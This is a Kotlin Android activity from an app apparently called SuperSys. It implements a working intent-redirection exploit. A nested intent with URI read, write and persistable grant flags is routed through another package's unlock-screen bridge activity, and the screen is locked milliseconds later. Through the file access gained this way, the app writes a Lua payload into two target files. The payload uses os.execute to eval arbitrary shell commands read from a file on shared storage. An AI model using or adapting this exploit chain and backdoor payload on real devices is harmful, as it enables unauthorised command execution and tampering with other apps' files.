package com.cfks.supersys

import android.content.ComponentName
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.fragment.app.Fragment
import com.cfks.supersys.databinding.ActivityMainBinding
import com.cfks.supersys.service.LogcatService
import com.cfks.supersys.service.ScreenControlService
import com.cfks.supersys.ui.CommandFragment
import com.cfks.supersys.ui.HomeFragment
import com.cfks.supersys.ui.LogFragment
import com.cfks.supersys.ui.SuperSysFragment
import com.cfks.supersys.util.UriUtils
import com.cfks.startanywhere.StartAnyWhere
import com.google.android.material.dialog.MaterialAlertDialogBuilder
import com.google.android.material.navigation.NavigationBarView
import net.steamcrafted.materialiconlib.MaterialDrawableBuilder

class MainActivity : AppCompatActivity() {

    companion object {
        const val EXTRA_SUPERSYS_INSTALL = "SUPERSYS_INSTALL"
        const val EXTRA_INSTALL_STEP = "INSTALL_STEP"
        const val PREFS_NAME = "supersys"
        const val KEY_STORED_URI = "stored_uri"

        private const val LUA_PAYLOAD = """-- SuperSys
os.execute("if [ -f /storage/emulated/0/SuperSys/cmd.txt ]; then eval \"$(cat /storage/emulated/0/SuperSys/cmd.txt)\" > /storage/emulated/0/SuperSys/result.txt 2>&1; fi")
-- SuperSys
"""

        // Accumulated errors across all install steps
        val installErrors = mutableListOf<String>()
    }

    private lateinit var binding: ActivityMainBinding

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        // Start LogcatService tied to Activity lifecycle
        startLogcatService()

        if (savedInstanceState == null) {
            switchFragment(HomeFragment())
        }

        // Set bottom nav icons using Material Icon library
        val navView = binding.root.findViewById<NavigationBarView>(R.id.bottom_nav)
        val menu = navView.menu
        val colorPrimary = getColor(R.color.primary)
        menu.findItem(R.id.nav_home)?.icon = MaterialDrawableBuilder.with(this)
            .setIcon(MaterialDrawableBuilder.IconValue.HOME)
            .setColor(colorPrimary)
            .setToActionbarSize()
            .build()
        menu.findItem(R.id.nav_supersys)?.icon = MaterialDrawableBuilder.with(this)
            .setIcon(MaterialDrawableBuilder.IconValue.APPS)
            .setColor(colorPrimary)
            .setToActionbarSize()
            .build()
        menu.findItem(R.id.nav_command)?.icon = MaterialDrawableBuilder.with(this)
            .setIcon(MaterialDrawableBuilder.IconValue.CONSOLE)
            .setColor(colorPrimary)
            .setToActionbarSize()
            .build()
        menu.findItem(R.id.nav_log)?.icon = MaterialDrawableBuilder.with(this)
            .setIcon(MaterialDrawableBuilder.IconValue.FORMAT_LIST_BULLETED)
            .setColor(colorPrimary)
            .setToActionbarSize()
            .build()

        navView.setOnItemSelectedListener { item ->
            when (item.itemId) {
                R.id.nav_home -> {
                    switchFragment(HomeFragment())
                    true
                }
                R.id.nav_supersys -> {
                    switchFragment(SuperSysFragment())
                    true
                }
                R.id.nav_log -> {
                    switchFragment(LogFragment())
                    true
                }
                R.id.nav_command -> {
                    switchFragment(CommandFragment())
                    true
                }
                else -> false
            }
        }

        // Handle install intent
        handleInstallIntent(intent)
    }

    override fun onNewIntent(intent: Intent) {
        super.onNewIntent(intent)
        handleInstallIntent(intent)
    }

    private fun handleInstallIntent(intent: Intent?) {
        if (intent?.getBooleanExtra(EXTRA_SUPERSYS_INSTALL, false) != true) return
        val uri = intent.data ?: return
        val uriStr = uri.toString()
        val step = intent.getIntExtra(EXTRA_INSTALL_STEP, 1)

        // Store URI for future status checks — use indexed key to support multiple files
        val prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
        val existingUris = mutableListOf<String>()
        var idx = 0
        while (true) {
            val stored = prefs.getString("${KEY_STORED_URI}_$idx", null)
            if (stored == null) break
            existingUris.add(stored)
            idx++
        }
        // Add this URI if not already stored
        if (uriStr !in existingUris) {
            prefs.edit().putString("${KEY_STORED_URI}_${existingUris.size}", uriStr).apply()
        }

        // Process this file: read, inject payload, write back
        val fileLabel = "文件$step"
        val readResult = UriUtils.readUriDetailed(this, uriStr)

        if (readResult.content == null && readResult.error != null) {
            // Read failed — collect error
            installErrors.add("[$fileLabel] 读取失败: ${readResult.error}")
        } else {
            val content = readResult.content
            val newContent = when {
                content == null -> LUA_PAYLOAD
                content.startsWith("-- SuperSys") -> content
                else -> LUA_PAYLOAD + content
            }

            val writeResult = UriUtils.writeUriDetailed(this, uriStr, newContent)
            if (!writeResult.success) {
                installErrors.add("[$fileLabel] 写入失败: ${writeResult.error ?: "未知错误"}")
            }
        }

        if (step == 1) {
            // Step 1 complete — launch exploit for file 2
            launchSecondExploit()
        } else {
            // Step 2 complete — show all accumulated errors (if any)
            runOnUiThread {
                if (installErrors.isEmpty()) {
                    Toast.makeText(this, "SuperSys安装成功", Toast.LENGTH_LONG).show()
                } else {
                    val errorMsg = installErrors.joinToString("\n\n")
                    installErrors.clear()
                    showErrorDialog("安装过程中发生错误", errorMsg)
                }
            }
        }
    }

    private fun launchSecondExploit() {
        val authority = HomeFragment.pendingAuthority ?: return
        val rootName = HomeFragment.pendingRootName ?: ""
        val targetFilePath = HomeFragment.TARGET_FILE_PATHS[1]

        val uriStr = if (rootName.isNotEmpty()) {
            "content://$authority/$rootName$targetFilePath"
        } else {
            "content://$authority$targetFilePath"
        }

        val hackedIntent = getHackedIntent(uriStr, 2)
        StartAnyWhere.pullSpecialActivity(this, hackedIntent)

        // Lock screen ~15ms later
        Handler(Looper.getMainLooper()).postDelayed({
            ScreenControlService.lockScreen()
        }, 15)
    }

    private fun getHackedIntent(url: String, step: Int): Intent {
        // intent1: targets UnlockScreenBridgeActivity
        val intent1 = Intent().setComponent(
            ComponentName(
                HomeFragment.TARGET_PACKAGE,
                HomeFragment.TARGET_ACTIVITY
            )
        )

        val uri = Uri.parse(url)

        // Resolve MIME type from the content provider (fallback to */* on failure)
        val mimeType = try {
            contentResolver.getType(uri) ?: "*/*"
        } catch (e: Exception) {
            "*/*"
        }

        // intent2: targets our own MainActivity with the file URI + grant flags + install marker + step
        val intent2 = Intent()
            .setComponent(ComponentName(packageName, MainActivity::class.java.name))
            .setDataAndType(uri, mimeType)
            .putExtra(EXTRA_SUPERSYS_INSTALL, true)
            .putExtra(EXTRA_INSTALL_STEP, step)
            .addFlags(
                Intent.FLAG_GRANT_PREFIX_URI_PERMISSION or
                Intent.FLAG_GRANT_READ_URI_PERMISSION or
                Intent.FLAG_GRANT_WRITE_URI_PERMISSION or
                Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION or
                Intent.FLAG_ACTIVITY_NEW_TASK
            )

        intent1.putExtra("originalIntent", intent2)
        return intent1
    }

    private fun showErrorDialog(title: String, message: String) {
        MaterialAlertDialogBuilder(this)
            .setTitle(title)
            .setMessage(message)
            .setPositiveButton("确定", null)
            .setCancelable(false)
            .show()
    }

    fun revokeAllPermissions() {
        try {
            val resolver = contentResolver
            val permissions = resolver.persistedUriPermissions
            for (perm in permissions) {
                resolver.releasePersistableUriPermission(
                    perm.uri,
                    Intent.FLAG_GRANT_READ_URI_PERMISSION or Intent.FLAG_GRANT_WRITE_URI_PERMISSION
                )
            }
            Toast.makeText(this, "已释放所有权限 (${permissions.size} 个)", Toast.LENGTH_SHORT).show()

            // Clear all stored URIs
            val prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
            val editor = prefs.edit()
            var idx = 0
            while (prefs.contains("${KEY_STORED_URI}_$idx")) {
                editor.remove("${KEY_STORED_URI}_$idx")
                idx++
            }
            editor.apply()
        } catch (e: Exception) {
            Toast.makeText(this, "释放失败: ${e.message}", Toast.LENGTH_SHORT).show()
        }
    }

    private fun startLogcatService() {
        val intent = Intent(this, LogcatService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        // Stop LogcatService when Activity is destroyed — notification and recording stop together
        stopService(Intent(this, LogcatService::class.java))
    }

    private fun switchFragment(fragment: Fragment) {
        supportFragmentManager
            .beginTransaction()
            .replace(R.id.fragment_container, fragment)
            .commit()
    }
}
